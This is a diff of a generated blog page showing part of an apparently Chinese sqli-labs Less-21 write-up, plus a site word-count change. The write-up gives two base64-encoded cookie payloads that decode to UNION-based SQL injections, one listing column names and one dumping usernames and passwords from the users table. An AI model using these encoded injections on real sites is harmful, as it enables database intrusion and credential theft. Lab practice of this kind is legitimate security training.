+<pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207003331834.png" alt="image-20220207003331834"></p>
 <p>爆内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002804799.png" alt="image-20220207002804799"></p>
 <p>Less-21最关键的就在于<strong>base64</strong>加解密的注入。</p>
@@ -1066,7 +1093,7 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
